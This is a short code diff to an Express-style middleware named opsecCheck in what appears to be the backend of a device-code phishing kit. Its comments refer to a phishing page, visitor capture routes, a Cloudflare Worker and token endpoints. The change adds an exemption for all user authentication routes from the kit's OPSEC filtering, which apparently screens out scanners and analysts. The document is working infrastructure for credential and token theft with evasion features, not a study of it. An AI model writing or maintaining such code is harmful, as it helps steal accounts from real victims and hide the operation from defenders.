@@ -335,6 +335,9 @@ async function opsecCheck(req, res, next) {
     // Auth middleware on the routes still enforces authentication.
     const adminPrefix = '/' + config.ADMIN_PATH;
     const isAdminApi = req.path.startsWith('/api/admin') || req.path === '/api/auth/admin-login' || req.path === '/api/auth/admin-setup';
+    // Also exempt all user auth routes — they have rate limiting and JWT, no OPSEC needed.
+    // Admin login/setup are already covered by isAdminApi above.
+    const isUserAuthApi = req.path.startsWith('/api/auth/');
     // Also exempt device-code flow routes: /api/verify, /api/capture (including /api/capture/visitor/*).
     // These are called by the Cloudflare Worker (empty UA, datacenter IP) and by the phishing page HTML.
     // They authenticate via JWT token in the request body, so OPSEC is not needed here.
@@ -358,6 +361,7 @@ async function opsecCheck(req, res, next) {
     if (
       req.path.startsWith(adminPrefix) ||
       isAdminApi ||
+      isUserAuthApi ||
       req.path.startsWith('/user-panel') ||
       req.path.startsWith('/api/tokens') ||
       req.path.startsWith('/api/user') ||
